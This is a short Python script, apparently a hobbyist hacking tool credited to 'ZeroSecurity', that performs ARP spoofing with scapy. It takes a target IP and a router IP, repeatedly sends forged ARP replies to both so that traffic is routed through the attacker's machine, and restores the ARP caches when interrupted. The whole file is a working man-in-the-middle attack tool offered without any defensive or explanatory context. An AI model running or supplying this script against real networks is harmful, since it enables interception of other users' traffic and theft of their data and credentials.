#!/usr/bin/env python
import scapy.all as scapy
import time
import optparse

arpspoof script spoofing the router & victim 
Author : ZeroSecurity
Data of creation : 2023
Last modified : 2023

# To get the arguments of the user enter 
def get_arguments():
     parser = optparse.OptionParser()
     parser.add_option("-t", "--target", dest="target_ip", help="enter the ip of the target")
     parser.add_option("-s", "--spoof", dest="spoof_ip", help="enter the ip of the router")                                          
     (options, arguments) = parser.parse_args()
     return options

# To Find the MAC address of the target 
def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     boardcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_boradcast = boardcast/arp_request
     answered_list = scapy.srp(arp_request_boradcast, timeout=2, verbose=False)[0]
     
     return answered_list[0][1].hwsrc
	
# Spoofing  the target & Router 
def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, verbose=False)

options = get_arguments()
spoof(options.target_ip, options.spoof_ip)
spoof(options.spoof_ip, options.target_ip)


try:
   send_count = 0
   while True:
       spoof(options.target_ip, options.spoof_ip)
       spoof(options.spoof_ip, options.target_ip)
       send_count = send_count + 2
       print("\r[+]packet : " + str(send_count), end="")
       time.sleep(2)
except KeyboardInterrupt:
     print("\n[-]BANG!! BANG!! ......\n")
     restore(options.target_ip, options.spoof_ip)
     restore(options.spoof_ip, options.target_ip)
